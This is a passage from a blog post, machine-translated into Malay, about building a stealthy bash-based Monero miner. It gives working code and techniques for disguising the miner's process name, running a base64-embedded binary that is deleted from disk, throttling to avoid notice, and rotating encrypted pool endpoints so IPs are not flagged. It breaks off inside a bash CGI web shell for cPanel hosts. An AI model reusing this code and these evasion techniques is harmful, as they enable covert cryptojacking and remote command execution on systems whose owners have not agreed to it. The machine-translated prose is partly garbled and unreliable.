        fd=<span class=hljs-variable>${fd/*\/}</span><span class=hljs-keyword>if</span> [[ ! <span class=hljs-string>" $* "</span> =~ <span class=hljs-string>" <span class=hljs-variable>${fd}</span> "</span> ]]; <span class=hljs-keyword>then</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$fd</span>"</span><span class=hljs-keyword>in</span>
                    0|1|2|255|<span class=hljs-string>"<span class=hljs-variable>$_snore_fd</span>"</span>)
                    ;;
                    *)
                        <span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>$fd</span>>&-"</span>
                        ;;
                <span class=hljs-keyword>esac</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span>
}</code></pre><p>Kami sedang menulis daemon, yang merupakan proses yang lama, dan kami menggunakan banyak deskriptor fail, kami benar-benar ingin melakukan pembersihan untuk mengelakkan terjadinya<a href=https://web.archive.org/web/https://linux.die.net/man/5/limits.conf> ulimits</a>.<pre><code class="bash hljs"><span class=hljs-comment>## queries ipinfo and gets the current ip and country/region</span><span class=hljs-function><span class=hljs-title>parse_ip</span></span> ()
{
    <span class=hljs-built_in>export</span> ip country region;
    [ ! -e cfg/geoip.json ] && <span class=hljs-built_in>log</span><span class=hljs-string>"geolocation codes file not found."</span> && <span class=hljs-built_in>return</span> 1;
    ipquery=$(http_req ipinfo.io);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed querying ipinfo"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'ip\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    ip=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$ip</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data ip"</span> && <span class=hljs-built_in>return</span> 1;
    before_after <span class=hljs-string>'country\": \"'</span><span class=hljs-string>"<span class=hljs-variable>$ipquery</span>"</span><span class=hljs-string>'\"'</span>;
    country=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>${after,,}</span>);
    [ -z <span class=hljs-string>"<span class=hljs-variable>$country</span>"</span> ] && <span class=hljs-built_in>log</span><span class=hljs-string>"failed parsing ipinfo data country"</span> && <span class=hljs-built_in>return</span> 1;
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\": {}</span>"</span> ]; <span class=hljs-keyword>then</span>
            before_after <span class=hljs-string>'"'</span><span class=hljs-string>"<span class=hljs-variable>$l</span>"</span><span class=hljs-string>'"'</span>;
            lastregion=$(<span class=hljs-built_in>echo</span><span class=hljs-variable>$after</span>);
        <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"<span class=hljs-variable>${country}</span>\"}</span>"</span> ]; <span class=hljs-keyword>then</span>
                region=<span class=hljs-variable>$lastregion</span>;
                <span class=hljs-built_in>break</span>;
            <span class=hljs-keyword>fi</span>;
        <span class=hljs-keyword>fi</span>;
    <span class=hljs-keyword>done</span> < cfg/geoip.json
}</code></pre><p>Fungsi ini bergantung<a href=https://ipinfo.io/> ipinfo</a> untuk menentukan wilayah pekerja, yang memungkinkan untuk menyesuaikan logik bergantung pada wilayah,<a href=\assets/posts/geoip.json> geoip.json</a> mengelompokkan negara menjadi wilayah, kerana kami menginginkan wilayah peringkat atas, dan tidak berminat dengan negara tertentu.<pre><code class="bash hljs"><span class=hljs-comment># try to open a connection to host $1 with port $2 and output to $3</span><span class=hljs-function><span class=hljs-title>open_connection</span></span>() {
    <span class=hljs-built_in>exec</span> {socket}<>/dev/tcp/<span class=hljs-variable>${1}</span>/<span class=hljs-variable>${2}</span> 2>/dev/null
    <span class=hljs-built_in>echo</span><span class=hljs-variable>$socket</span> >&<span class=hljs-variable>${3}</span>
}

<span class=hljs-comment>## check if a tcp connection to $1=$HOST $2=$PORT is successful</span><span class=hljs-function><span class=hljs-title>check_connection</span></span>() {
    <span class=hljs-built_in>local</span> host=<span class=hljs-variable>$1</span> port=<span class=hljs-variable>$2</span> conn_socket=
    [ -z <span class=hljs-string>"<span class=hljs-variable>$host</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no host provided'</span>; <span class=hljs-built_in>return</span> 1; }
    [ -z <span class=hljs-string>"<span class=hljs-variable>$port</span>"</span> ] && { <span class=hljs-built_in>echo</span><span class=hljs-string>'no port provided'</span>; <span class=hljs-built_in>return</span> 1; }
    newfd conn_socket
    timeout 3 open_connection <span class=hljs-variable>$host</span><span class=hljs-variable>$port</span><span class=hljs-variable>$conn_socket</span><span class=hljs-comment># read the fd of the opened connection from the conn_socket fd and close it</span>
    read_fd <span class=hljs-variable>$conn_socket</span> avl -
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$avl</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment># close connection</span><span class=hljs-built_in>eval</span><span class=hljs-string>"exec <span class=hljs-variable>${avl}</span><&-"</span> &>/dev/null
        <span class=hljs-built_in>return</span> 0 <span class=hljs-comment>## connection can be established</span><span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## connection can't be established</span><span class=hljs-keyword>fi</span>
}</code></pre><p>Bash mempunyai sokongan untuk sambungan tcp, dengan pengurangan abstraksi<code>/dev/tcp</code> (juga untuk udp, tetapi sepertinya kebanyakannya biasanya dilumpuhkan pada waktu pembuatan, jadi anda tidak boleh bergantung padanya). Fail-fail ini adalah perkara yang tidak jelas, bukan merupakan sebahagian daripada linux<code>/dev</code> pokok.<p>Perlu disebut juga sistem penguncian untuk menangani kesesuaian antara pekerjaan bash. Untuk membolehkan banyak pekerjaan berfungsi dengan kunci, mereka semua perlu berkongsi deskriptor fail, jadi kami<code>locker</code> yang juga merupakan pekerjaan, harus dimulakan sebelum pekerjaan lain yang ingin menggunakan kunci. Loker hanya membaca<code>stdin</code> menunggu permintaan mengunci, menjawab<code>stdout</code> bergantung pada keadaan boolean semasa yang disimpan dalam pemboleh ubah. Saya tidak menjamin bahawa pendekatan ini bebas daripada perlumbaan, tetapi nampaknya berfungsi dengan sopan, sebaliknya, saya mendapati deskriptor fail tidak begitu dipercayai, kerana saya mengesyaki terdapat beberapa penyangga yang tidak tersingkir di suatu tempat<em> paip</em> dan akhirnya mencapai kebuntuan (yang bermaksud bahawa anda tidak boleh bergantung pada loker yang memberi anda jawapan sepanjang masa).<pre><code class="bash hljs"><span class=hljs-comment>## unset bash env apart excluded vars/funcs</span><span class=hljs-function><span class=hljs-title>clear_env</span></span>(){
    <span class=hljs-built_in>local</span><span class=hljs-built_in>functions</span>=$(<span class=hljs-built_in>declare</span> -F)
    <span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions//declare -f }</span><span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/$u[[:space:]]}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u}</span><span class=hljs-built_in>functions</span>=<span class=hljs-variable>${functions/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>local</span> vars=$(<span class=hljs-built_in>set</span> -o posix; <span class=hljs-built_in>set</span> | <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-built_in>echo</span><span class=hljs-variable>${l/=*}</span>; <span class=hljs-keyword>done</span>)
    <span class=hljs-keyword>for</span> u <span class=hljs-keyword>in</span><span class=hljs-variable>$@</span>; <span class=hljs-keyword>do</span>
        vars=<span class=hljs-variable>${vars/$u[[:space:]]}</span>
        vars=<span class=hljs-variable>${vars/[[:space]]$u}</span>
        vars=<span class=hljs-variable>${vars/[[:space:]]$u[[:space:]]}</span><span class=hljs-keyword>done</span><span class=hljs-built_in>unset</span> -f <span class=hljs-variable>$functions</span> &>/dev/null
    <span class=hljs-built_in>unset</span> -v <span class=hljs-variable>$vars</span> &>/dev/null
    <span class=hljs-comment># unset $vars &>/dev/null</span>
}

<span class=hljs-comment>## unexport most variables</span><span class=hljs-function><span class=hljs-title>dex_env</span></span>() {
    exported=$(<span class=hljs-built_in>export</span> -p)
    <span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> e; <span class=hljs-keyword>do</span>
        n=<span class=hljs-variable>${e/declare -*x }</span>
        [ <span class=hljs-string>"<span class=hljs-variable>$n</span>"</span> = <span class=hljs-string>"<span class=hljs-variable>$e</span>"</span> ] && <span class=hljs-built_in>continue</span><span class=hljs-comment>## multiline var</span>
        n=<span class=hljs-variable>${n/=*}</span><span class=hljs-keyword>case</span><span class=hljs-string>"<span class=hljs-variable>$n</span>"</span><span class=hljs-keyword>in</span><span class=hljs-string>"SHELL"</span>|<span class=hljs-string>"USER"</span>|<span class=hljs-string>"HOME"</span>|<span class=hljs-string>"TMUX"</span>|<span class=hljs-string>"CHARSET"</span>|<span class=hljs-string>"TERM"</span>)
                <span class=hljs-built_in>continue</span>
                ;;
            *)
                dexported=<span class=hljs-string>"<span class=hljs-variable>$dexported</span><span class=hljs-variable>${n/=*}</span>"</span><span class=hljs-keyword>esac</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-variable>$exported</span>"</span><span class=hljs-built_in>export</span> -n <span class=hljs-variable>$dexported</span>
}</code></pre><p>Bersihkan sampah anda ... program bash yang kompleks akhirnya menggunakan banyak pemboleh ubah, dan jika anda menyalahgunakan ruang global, ia akan menjadi kabur. Sekiranya anda menghasilkan pekerjaan shell, mereka mewarisi semua persekitaran (yang digandakan secara efektif, tidak dikongsi), anda dapat dengan cepat berakhir dengan makan<code>100M</code> ingatan, tidak bagus. Kami juga mahu bersikap rendah. Dalam senario penyebaran kami, musuh<sup id=fnref:adversary><a class=fnref href=#fndef:adversary>[1]</a></sup> berpotensi mempunyai akses root dan maklumat lengkap mengenai proses kami<sup id=fnref:infoproc><a class=fnref href=#fndef:infoproc>[2]</a></sup> , dan anda tahu ... setiap proses menyimpan maklumat mengenai arahan penuh yang memulakannya, dan pemboleh ubah persekitaran yang dieksport.<h2 id=configuration><a class=header-anchor href=#configuration> Konfigurasi</a></h2><p>Setelah kita mempunyai persekitaran, dan alat kita, kita harus menyesuaikan penambang untuk mesin yang sedang berjalan, langkah-langkah konfigurasi dalam kod pseudo:<ul><li><p>nama proses untuk pelombong<li><p>maklumat hos (ram / core / cache /<code>ENV_VARS</code>)<li><p>versi konfigurasi<li><p><code>worker_id</code> untuk pelombong (dari ip dan host)<li><p>ip / port untuk sambungan</ul><p>Memilih nama untuk proses tersebut diperlukan untuk<em> bersembunyi</em> hakikat bahawa kita menjalankan pelombong, tetapi kita tidak hanya menukar nama binari kita, kita mempunyai senarai<strong> topeng</strong> untuk calon yang berpotensi (fail teks biasa di mana setiap baris adalah topeng):<ul><li><p>pilih topeng secara rawak<li><p>rombak elemen ekor tali (semua kecuali yang pertama) untuk mendapatkan arahan proses yang pelbagai. Sekarang kita mempunyai tali seperti<code>cmd --arg2 --arg1 --arg3</code> . Ini adalah topeng penambang kami, kami menjalankan perduaan<em> tanpa</em> argumen, tetapi sepertinya kita memulakan perintah<code>cmd</code> dengan hujah<code>--arg1 --arg2 --arg3</code> . Ruang dan tanda hubung dibenarkan dalam nama fail, jadi tidak mengapa menjalankan binari yang dinamakan seperti ini, sepertinya linux tidak membezakan antara yang dapat dilaksanakan dan argumen ketika menyimpan perintah proses.<p>Konfigurasi pelombong dimuat secara automatik dari<code>$PWD</code>.</ul><h3 id=hashrate><a class=header-anchor href=#hashrate> Hashrate</a></h3><p>, dengan masa, pelombong hulu mendapat banyak<strong> penalaan automatik</strong> ciri, jadi itu menjadikan sebahagian skrip saya berlebihan, tetapi perbezaan antara hulu dan hilir di sini adalah bahawa tujuan hulu adalah memaksimumkan<em> prestasi</em> , sementara tujuan kami adalah untuk memaksimumkan<em> kecekapan dan kekaburan</em> , kita tidak mahu mengatasi sistem, kita mahu sedikit lintah tanpa gangguan perkhidmatan.<sup id=fnref:monerominer><a class=fnref href=#fndef:monerominer>[3]</a></sup><p>Untuk ini, kita memerlukan pemahaman yang lebih terperinci mengenai persekitaran, iaitu<code>l2/l3</code> struktur cache pemproses, ram, dan teras, dan pemproses semasa<em> rata-rata</em> beban dan cpu<em> penggunaan</em>. Saya cuba membina sebuah<a href=https://en.wikipedia.org/wiki/Finite-state_machine> mesin negeri</a> dalam bash yang akan bermula dari minimum dan mencuba konfigurasi yang berbeza perlahan-lahan menyelesaikan rata-rata yang terbaik. Ia adalah<strong> besar</strong> pembaziran usaha yang penuh dengan<a href=https://en.wikipedia.org/wiki/Technical_debt> hutang teknikal</a> yang muflis sangat cepat dan kebanyakannya dibuang, dengan hanya sisa-sisa yang tinggal di pangkalan data.<p>Pecahkan semua jumbo penalaan automatik ini, kami hanya membuat tidur penambang bergantung pada penggunaan / beban host, ini memerlukan pengubahsuaian pelombong untuk<code>sleep</code> antara hasil utas, dan beberapa pembaikan pada pengawas konfigurasi<sup id=fnref:configwatch><a class=fnref href=#fndef:configwatch>[4]</a></sup> , yang membolehkan kita memuatkan jumlah tidur pada waktu runtime. Logiknya jauh lebih mudah dan kelihatan seperti ini:<ul><li><p>jika penggunaan melebihi / di bawah $ TARGET_USAGE (Â± margin of error) tingkatkan / kurangkan tidur<li><p>jika beban purata dalam<code>1m</code> berada di atas / bawah $ TARGET_LOAD jeda / meneruskan perlombongan</ul><h3 id=connection><a class=header-anchor href=#connection> Sambungan</a></h3><p>Dalam rundingan bash kami menunjukkan utiliti untuk sambungan. Mengapa kita memerlukannya? Kerana kita memerlukan kepelbagaian; hanya dengan sukar mengekod titik akhir ke dalam konfigurasi tidak akan bertahan lama, ketika sesuatu kelihatan mencurigakan, dan mempunyai aktiviti rangkaian, IP ditandai.<p>Pada mulanya kami bereksperimen dengan beberapa kaedah:<ul><li><p>menggunakan<a href=https://web.archive.org/web/20210121093409/https://github.com/haad/proxychains> rantaian proksi</a> untuk memuatkan lebih banyak panggilan rangkaian pelombong, tetapi ia memerlukan penambang dibina dengan perpustakaan dinamik, dan anda harus menghantarnya dengan muatan, jadi tidak praktikal.<li><p>berjalan a<a href=https://web.archive.org/web/20210315094551/https://github.com/ginuerzh/gost> terowong ke hadapan</a> berdampingan dengan pelombong: ini memiliki banyak konfigurasi overhead, seperti sekarang kami mengkonfigurasi dua proses pada setiap penyebaran, yang berjumlah lebih banyak bug.</ul><p>Pada akhirnya kami menyelesaikan dengan hanya menghantar senarai titik akhir, disimpan dalam pemboleh ubah bash, memilih satu secara rawak. Sambungan tentu saja disulitkan. Apakah titik akhir ini? Penghantar ke proksi yang akan menangani pekerjaan pelombong.<p>Mengapa kita memerlukan<a href=https://web.archive.org/web/20201207221231/https://github.com/Snipa22/xmr-node-proxy> proksi perlombongan</a> ? Saya tidak pernah melewati ~ 100 sambungan serentak, jadi proksi tidak begitu diperlukan untuk memuatkan rangkaian, tetapi lebih mudah untuk merundingkan algoritma hash, dan memberikan sasaran kesukaran yang berbeza kepada pelombong yang berbeza, untuk mengelakkan pelombong bekerja<strong> kesukaran</strong> sasaran yang memerlukan mereka terlalu banyak masa untuk diselesaikan dan mengelakkan risiko membuang pengiraan untuk pekerjaan yang belum selesai.<sup id=fnref:difficulty><a class=fnref href=#fndef:difficulty>[5]</a></sup> Perisian kumpulan juga memerlukan beberapa pengubahsuaian kerana dengan senang hati mengiklankan untuk menjadi proksi pada permintaan http biasa ...<em> yang mesti habis masa</em> , dan garpu menambahkan kawalan akses jadi kami menggunakan mod kami berdasarkan itu.<sup id=fnref:stratumprotocol><a class=fnref href=#fndef:stratumprotocol>[6]</a></sup><h3 id=editing_json><a class=header-anchor href=#editing_json> Menyunting json</a></h3><p>Menerapkan pengubahsuaian ke file json dengan hanya bash yang kami dapat dengan beberapa penggantian env var, dan beberapa regex. Pada mulanya kami bergantung pada<code>envsubst</code> binari untuk menerapkan pemboleh ubah, maka kami pergi sepenuhnya<sup id=fnref:fullbash><a class=fnref href=#fndef:fullbash>[7]</a></sup> dengan logik ini:<ul><li><p>baca templat konfigurasi<li><p>ganti semua petikan dengan rentetan yang sangat esoterik (seperti<code>_#_#</code>)<li><p><code>eval</code> templat<li><p>ganti semua kejadian esoterik kembali dengan petikan</ul><p>Selain mengelakkan sub proses, kelebihan lain adalah kita memperoleh keupayaan bash lengkap dalam templat kita. Untuk membaca dan menulis tanpa templat, kita harus bergantung pada kemampuan bash regex:<pre><code class="bash hljs">cc_rgx=<span class=hljs-string>'( *".*?" *: *)("(.*?)"|([^,]*?)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>change_config</span></span>() {
	<span class=hljs-built_in>local</span> subs
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$cc_rgx</span> ]]
			matches=(<span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[@]}</span>"</span>)
			[ -n <span class=hljs-string>"<span class=hljs-variable>${matches[3]}</span>"</span> -a <span class=hljs-string>"<span class=hljs-variable>${2:0:1}</span>"</span> != <span class=hljs-string>"\""</span> ] &&
				subs=<span class=hljs-string>"\"<span class=hljs-variable>$2</span>\""</span> ||
				subs=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span>
			CONFIG=<span class=hljs-variable>${CONFIG/<span class=hljs-variable>${matches[0]}</span>/<span class=hljs-variable>${matches[1]}</span>$subs<span class=hljs-variable>${matches[5]}</span>}</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}

<span class=hljs-comment>## output miner config value $1 unquoted</span>
gc_rgx=<span class=hljs-string>' *"[^:]+" *: *("(.*?)"|([^,]*)) *(,|.*?\/\/.*?|\n|$)'</span><span class=hljs-function><span class=hljs-title>get_config</span></span>() {
	<span class=hljs-keyword>while</span><span class=hljs-built_in>read</span> l; <span class=hljs-keyword>do</span><span class=hljs-keyword>if</span> [ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> != <span class=hljs-string>"<span class=hljs-variable>${l/\"*$1*\"*:/}</span>"</span> ]; <span class=hljs-keyword>then</span>
			[[ <span class=hljs-string>"<span class=hljs-variable>${l}</span>"</span> =~ <span class=hljs-variable>$gc_rgx</span> ]]
			[ -n <span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ] &&
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[2]}</span>"</span> ||
				<span class=hljs-built_in>printf</span><span class=hljs-string>'%s'</span><span class=hljs-string>"<span class=hljs-variable>${BASH_REMATCH[3]}</span>"</span><span class=hljs-built_in>break</span><span class=hljs-keyword>fi</span><span class=hljs-keyword>done</span> <<<<span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$CONFIG</span>"</span> 2>/dev/null)</span>"</span>
}</code></pre><p>Ini hanya membolehkan kita mengedit baris tunggal, untuk entri berbilang baris ia hanya menganggap baris pertama..tapi cukup baik untuk kes penggunaan kita.<h2 id=runtime><a class=header-anchor href=#runtime> Masa Jalan</a></h2><p>Seperti apa jangka masa runtime kami? Kami mempunyai proses bash utama yang menjalankan loop utama, kemudian sub-proses penambang, sub-proses monitor cpu, loker dan penala. Itu hampir segelintir.<p>Mula-mula kami ingin memastikan bahawa jika ada yang salah, kami tidak meninggalkan kekacauan, ini bermaksud bahawa kami menggunakan bash trap untuk melakukan pembersihan semasa penamatan<pre><code class="bash hljs"><span class=hljs-built_in>trap</span><span class=hljs-string>"trap - SIGINT EXIT SIGKILL SIGTERM; kill -9 \$(jobs -p); cleanup &>/dev/null ; fleep 10"</span> SIGINT EXIT SIGKILL SIGTERM</code></pre><p><code>trap - ...</code> membongkar perangkap untuk mengelakkan berulang. Perangkap membunuh semua pekerjaan dan membuang persekitaran kerja.<p>Sudah tiba masanya untuk memulakan penambang, yang disimpan sebagai pemboleh ubah bash dalam pengekodan base64. Kami membuangnya pada sistem fail, kemudian kita membuang konfigurasi, menjalankan pelombong, dan membuang kedua-dua penambang dan konfigurasi. Pada linux, anda boleh membuang proses yang dapat dijalankan, (pada tingkap ini tidak dibenarkan).<sup id=fnref:memoryondemand><a class=fnref href=#fndef:memoryondemand>[8]</a></sup> Semasa pelombong sedang berjalan, pada sistem fail hanya ada<code>.. /</code> direktori dengan a<code>b64</code> pautan di dalamnya.<pre><code class="bash hljs"><span class=hljs-comment>## put a file $1 into a var $2</span><span class=hljs-function><span class=hljs-title>fileToVar</span></span>(){
    <span class=hljs-built_in>declare</span> -n tmpd=<span class=hljs-string>"<span class=hljs-variable>$2</span>"</span> && tmpd=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>) && <span class=hljs-built_in>return</span><span class=hljs-keyword>if</span> [ -z <span class=hljs-string>"<span class=hljs-variable>$tmpd</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-built_in>log</span><span class=hljs-string>"gobbling in array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$2</span>=1"</span><span class=hljs-comment>## avoid empty checks</span>
        gobbled[<span class=hljs-variable>$2</span>]=$(b64e <span class=hljs-string>"<span class=hljs-variable>$1</span>"</span>)
    <span class=hljs-keyword>else</span><span class=hljs-built_in>return</span> 1 <span class=hljs-comment>## do not quote assignment otherwise ram is not released</span><span class=hljs-keyword>fi</span>
}
<span class=hljs-comment>## put a var $1 into a file $2</span><span class=hljs-function><span class=hljs-title>varToFile</span></span>(){
    <span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$VERBOSE</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n 2>><span class=hljs-variable>${VERBOSE}</span> && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" 1>\"<span class=hljs-variable>$2</span>\" 2>><span class=hljs-variable>${VERBOSE}</span>"</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>else</span><span class=hljs-keyword>if</span><span class=hljs-built_in>declare</span> -n && <span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\$<span class=hljs-variable>$1</span>\" >\"<span class=hljs-variable>$2</span>\""</span>; <span class=hljs-keyword>then</span><span class=hljs-built_in>return</span><span class=hljs-keyword>else</span><span class=hljs-comment># log "dumping from array"</span><span class=hljs-built_in>eval</span><span class=hljs-string>"b64d <<<\"\${gobbled[<span class=hljs-variable>$1</span>]}\" >\"<span class=hljs-variable>$2</span>\""</span> && <span class=hljs-built_in>return</span><span class=hljs-keyword>fi</span><span class=hljs-built_in>return</span> 1
    <span class=hljs-keyword>fi</span>
}</code></pre><p>Satu keanehan yang menjengkelkan yang dihadapi dengan bash semasa mengekodkan pelombong ialah menetapkan pemboleh ubah dengan subshell dengan tanda kutip<code>myvar="$(something)"</code> menyebabkan peningkatan penggunaan memori secara kekal, ini sukar untuk di-debug dan tidak benar-benar menemui alasan mengapa berkelakuan seperti ini, bagaimanapun tugasan harus tidak disebut. Penyahkodan sebaliknya dilakukan dengan<em> keturunan</em> yang merupakan abstraksi berbanding fail sementara, pemboleh ubah dibuang ke dalam fail yang kemudian disalurkan kembali ke proses.<p>Gelung jangka panjang pelombong:<ul><li><p>walaupun benar<ul><li><p>berhenti pelombong<li><p>buang konfigurasi<li><p>mulakan pelombong<li><p>walaupun benar<ul><li><p>mulakan daemon<ul><li><p>semasa pelombong sedang berjalan<ul><li><p>baca output dari pelombong<li><p>pilih tindakan penambang berdasarkan garis output</ul></ul><li><p>jika pelombong tidak berjalan: rehat</ul><li><p>tidur</ul></ul><p>Garis keluaran dipadankan dengan beberapa regex:<pre><code class="bash hljs">act_rgx=<span class=hljs-string>'(accepted|speed|paused|algo:|-> update config|-> publish config|-> trigger restart|\[CC\-Client\] error|Error: \"\[Connect\]|POOL #1:      \(null\))|not enough memory|self-test failed|read error|cpu  disabled'</span></code></pre><p>Daemon menangani kes di mana<ul><li><p>sambungan ke titik akhir memberikan kesilapan (pilih titik akhir rawak baru)<li><p>algoritma hashing berubah (laraskan waktu tidur dan konfigurasi ad-hoc)<li><p>masalah pelombong (mulakan semula pelombong).</ul><p>Untuk sementara waktu terdapat sokongan untuk papan pemuka perintah dan kawalan, yang memungkinkan untuk memicu restart manual, namun sejak penggunaannya minimum, ia dibuang, dan titik akhirnya diganti dengan sambungan kolam alternatif, proses restart juga tidak stabil, kompleks. ..lain contoh hutang teknologi. Namun ia memungkinkan untuk mengambil kembali muatan yang diperbaharui dan mengatur ulang semua konfigurasi dengan cepat, yang sangat keren, trampolin utama.<h2 id=debugging><a class=header-anchor href=#debugging> Menyahpepijat</a></h2><p>Terdapat tiga utiliti utama<ul><li><p>aktifkan / lumpuhkan penjejakan di sekitar blok kod (kami tidak mahu mengesan binari yang dikodkan b64 dalam pemboleh ubah ..)<li><p>fungsi mudah untuk memformat log<li><p>bendera yang akan mengaktifkan pembalakan secara verbose pada waktu runtime setiap kali pelombong dimulakan.<ul><li><p>adakah fail tersebut<code>.debug</code> ada?<ul><li><p>aktifkan pembalakan secara verbose</ul></ul></ul><h2 id=target_deployments><a class=header-anchor href=#target_deployments> Penyebaran sasaran</a></h2><p>Penyediaan ini telah diuji pada 3 jenis hos:<h3 id=self_hosted_containers_or_vms><a class=header-anchor href=#self_hosted_containers_or_vms> Bekas atau VM yang dihoskan sendiri</a></h3><p>Banyak penyedia hosting tidak menyukai perlombongan kerana sumber CPU cenderung untuk dikongsi di antara beberapa pengguna, dan perisian perlombongan dapat dengan mudah memperlambat node host yang mempengaruhi prestasi untuk pengguna yang lain. Ini dapat berlaku walaupun waktu pengguna CPU tidak terbatas, kerana algoritma hashing dapat memenuhi semua lapisan cache CPU jika cache dibagi di antara semua inti CPU.<p>Kami ingin menggunakan kami<em> adil</em> berkongsi sumber tanpa dilarang, itu adalah kes penggunaan yang baik untuk penyamun stealth kami kerana ini adalah penggunaan host yang sedar, yang bermaksud<em> semestinya</em> tetap berada dalam lingkungan [AUP]. Tidak ada langkah tambahan ketika menangani penyebaran yang dihoskan sendiri, hanya skrip pelancar, mungkin ditambahkan ke urutan boot atau dilancarkan secara manual.<h3 id=cpanel_based_web_hosting><a class=header-anchor href=#cpanel_based_web_hosting> hosting web berasaskan cPanel</a></h3><p>Pelan langganan hosting web kebanyakannya ditawarkan melalui [cPanel]. Sekali lagi di sini kita menggunakan rancangan langganan peribadi yang mempunyai had sumber yang munasabah, sebaliknya rancangan percuma mempunyai had yang tidak masuk akal<sup id=fnref:freehostinglimits><a class=fnref href=#fndef:freehostinglimits>[9]</a></sup> . cPanel membolehkan anda menentukan pengendali untuk peluasan fail yang berbeza, ini memungkinkan kami untuk menjalankan skrip shell melalui<a href=https://en.wikipedia.org/wiki/Common_Gateway_Interface> cgi</a> dengan permintaan http terhadap skrip shell yang dimuatkan di pelayan. Antaramuka seperti inilah yang kelihatan seperti cengkerang web<sup id=fnref:cpanelssh><a class=fnref href=#fndef:cpanelssh>[10]</a></sup> . Cangkang web bash sederhana<pre><code class="bash hljs"><span class=hljs-comment># without content encoding the request response won't be honored</span><span class=hljs-built_in>echo</span> -e <span class=hljs-string>'Content-Type: text/plain\n'</span>
SERVER_NAME=myserver
<span class=hljs-comment>## parse vars (for interactive use)</span>
saveIFS=<span class=hljs-variable>$IFS</span>
IFS=<span class=hljs-string>'=&'</span>
parm=(<span class=hljs-variable>$QUERY_STRING</span>)
IFS=<span class=hljs-variable>$saveIFS</span><span class=hljs-keyword>for</span> ((i=0; i<<span class=hljs-variable>${#parm[@]}</span>; i+=2))
<span class=hljs-keyword>do</span><span class=hljs-built_in>declare</span> var_<span class=hljs-variable>${parm[i]}</span>=<span class=hljs-variable>${parm[i+1]}</span><span class=hljs-keyword>done</span><span class=hljs-comment>## exec command for interactive and proclimited scenarios</span>
url_encoded=<span class=hljs-string>"<span class=hljs-variable>${var_path//+/ }</span>"</span><span class=hljs-built_in>export</span> PATH=<span class=hljs-string>".:<span class=hljs-variable>$PATH</span>"</span>
. /dev/shm/srv/utils/load.env &>/dev/null

